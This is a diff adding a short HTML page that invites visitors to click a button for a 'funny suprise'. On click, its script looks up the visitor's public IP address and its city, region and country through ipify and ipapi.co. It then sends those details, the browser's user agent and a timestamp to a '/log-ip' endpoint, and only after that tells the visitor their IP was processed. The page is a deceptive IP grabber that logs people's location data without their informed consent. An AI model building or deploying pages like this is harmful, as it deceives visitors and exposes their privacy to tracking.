@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>click the button</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 20px;
+            text-align: center;
+        }
+        button {
+            padding: 12px 24px;
+            font-size: 16px;
+            background-color: #5865F2;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #4752C4;
+        }
+        #status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 4px;
+            display: none;
+        }
+        .disclaimer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #666;
+            border-top: 1px solid #eee;
+            padding-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <h1>click the button website thing</h1>
+    <p>click the button below:</p>
+    
+    <button id="trackButton">Click Me</button>
+    
+    <div id="status"></div>
+    
+    <div class="disclaimer">
+        <p><strong>click the button for a funny suprise</p>
+    </div>
+
+    <script>
+        document.getElementById('trackButton').addEventListener('click', async function() {
+            const button = this;
+            const status = document.getElementById('status');
+            
+            button.disabled = true;
+            button.textContent = 'Processing...';
+            status.style.display = 'none';
+            
+            try {
+                // Get IP address from a service
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+                
+                // Get additional information
+                const infoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                const info = await infoResponse.json();
+                
+                // Send to your server/backend
+                const response = await fetch('/log-ip', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        ip: ip,
+                        city: info.city || 'Unknown',
+                        region: info.region || 'Unknown',
+                        country: info.country_name || 'Unknown',
+                        userAgent: navigator.userAgent,
+                        timestamp: new Date().toISOString(),
+                        page: window.location.href
+                    })
+                });
+                
+                if (response.ok) {
+                    status.textContent = 'Ip Adress Request processed successfully!';
+                    status.style.color = '#4CAF50';
+                    status.style.backgroundColor = '#E8F5E9';
+                } else {
+                    throw new Error('Server error');
+                }
+                
+            } catch (error) {
+                status.textContent = 'An error occurred. Please try again.';
+                status.style.color = '#F44336';
+                status.style.backgroundColor = '#FFEBEE';
+                console.error('Error:', error);
+            } finally {
+                button.disabled = false;
+                button.textContent = 'click me';
+                status.style.display = 'block';
+            }
+        });
+    </script>
+</body>
+</html>
